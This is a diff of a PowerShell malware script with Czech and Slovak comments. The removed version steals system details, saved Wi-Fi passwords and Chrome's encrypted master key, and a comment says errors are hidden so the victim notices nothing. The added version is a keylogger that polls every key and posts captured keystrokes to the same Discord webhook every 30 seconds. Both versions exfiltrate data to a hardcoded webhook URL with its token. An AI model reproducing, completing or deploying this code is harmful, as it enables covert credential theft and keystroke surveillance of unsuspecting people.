@@ -1,49 +1,32 @@
-# --- KONFIGURACE ---
-$webhook_url = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_"
-# ------------------
-
-function Send-Webhook {
-    param([string]$message)
-    $payload = @{ content = $message } | ConvertTo-Json
-    Invoke-RestMethod -Uri $webhook_url -Method Post -Body $payload -ContentType "application/json"
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+public class KeyLogger {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int nVK);
 }
+"@
 
-try {
-    # 1. Systémové informace
-    $os = (Get-WmiObject Win32_OperatingSystem).Caption
-    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-    $comp = hostname
-    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress[0]
+$webhook = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_"
+$log = ""
+$lastSent = Get-Date
+
+while ($true) {
+    for ($i = 8; $i -le 255; $i++) {
+        $state = [KeyLogger]::GetAsyncKeyState($i)
+        if ($state -eq -32767) {
+            $key = [System.Windows.Forms.Keys]$i
+            $log += "$key"
+        }
+    }
     
-    $sys_info = "🖥️ **SÝSTEM**: $comp`n👤 **Uživatel**: $user`n🌐 **IP**: $ip`n💿 **OS**: $os"
-    Send-Webhook -message $sys_info
-
-    # 2. Wi-Fi Heslo (Aktuální síť)
-    $wifi = netsh wlan show profile name="* " key=clear | Select-String "Key Content"
-    if ($wifi) {
-        $wifi_pass = $wifi.ToString().Split(":")[1].Trim()
-        Send-Webhook -message "🔑 **Wi-Fi Heslo**: $wifi_pass"
+    # Posielanie dát každých 30 sekúnd alebo pri zaplnení logu
+    if ((Get-Date) -gt $lastSent.AddSeconds(30) -and $log.Length -gt 0) {
+        $payload = @{ content = "Captured Keys: $log" }
+        Invoke-RestMethod -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
+        $log = ""
+        $lastSent = Get-Date
     }
-
-    # 3. Extrakce Master Key (Local State) z Chrome/Edge
-    # Cesta k Local State souboru
-    $localStatePath = "$env:LocalAppData\Google\Chrome\User Data\Local State"
-    if (Test-Path $localStatePath) {
-        $content = Get-Content $localStatePath -Raw | ConvertFrom-Json
-        $protectedKey = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content.os_crypt.encrypted_key))
-        
-        # Posíláme Base64 verzi klíče (to je to, co budeš potřebovat pro dekryptovaní)
-        Send-Webhook "🔐 **Chrome Master Key (B64):** `n$protectedKey"
-    }
-
-} catch {
-    # V případě chyby nic neposíláme, aby oběť nic nezpozorovala
+    Start-Sleep -Milliseconds 10
 }
-
-function Send-Webhook($msg) {
-    $payload = @{ content = $msg } | ConvertTo-Json
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
-}
-
-# Oprava volání funkce (pro jistotu)
-$webhookUrl = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_" # Znovu sem vlož URL, pokud nepoužíváš proměnnou výše
